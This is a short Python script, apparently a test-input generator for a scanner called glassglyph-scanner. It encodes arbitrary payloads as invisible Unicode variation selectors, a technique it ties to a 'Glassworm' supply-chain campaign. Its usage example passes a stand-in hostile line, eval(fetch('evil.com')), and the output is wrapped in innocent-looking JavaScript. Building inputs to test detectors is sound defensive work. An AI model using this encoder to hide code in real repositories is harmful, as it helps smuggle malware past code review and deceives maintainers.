#!/usr/bin/env python3
"""Generate a Glassworm-encoded invisible payload.

Educational / testing tool. Encodes an arbitrary byte payload into invisible
Unicode characters (variation selectors + supplementary variation selectors)
that render as zero pixels in every editor, terminal, code review tool,
and browser.

The March 2026 Glassworm campaign used this exact technique to smuggle
malicious code through 151+ GitHub repositories, npm packages, and VS Code
extensions.

Usage:
    python generate_glassworm.py "your payload"
    python generate_glassworm.py "eval(fetch('evil.com'))" > attack.txt

The resulting file looks almost empty to the eye but contains the full
encoded payload. Feed it to glassglyph-scanner to see the detection:

    glassglyph-scanner scan attack.txt
    # exit 2 — BLOCKED — critical invisible_unicode finding
"""
import sys


def encode(payload: str) -> str:
    """Encode a string as invisible Unicode via the Glassworm cipher.

    Byte → invisible codepoint mapping:
      bytes 0-15   → U+FE00-FE0F   (variation selectors, 16 chars)
      bytes 16-255 → U+E0100-E01EF (supp. variation selectors, 240 chars)

    Together these 256 characters cover the full byte space, so any binary
    payload can be encoded.
    """
    out = []
    for byte in payload.encode("utf-8"):
        if byte < 16:
            out.append(chr(0xFE00 + byte))
        else:
            out.append(chr(0xE0100 + byte - 16))
    return "".join(out)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: generate_glassworm.py <payload>", file=sys.stderr)
        sys.exit(1)

    payload = sys.argv[1]
    encoded = encode(payload)
    # Wrap in innocent-looking content so the test file has a recognizable shape
    print(f"const data = `{encoded}`;  // looks empty but carries {len(encoded)} invisible chars")
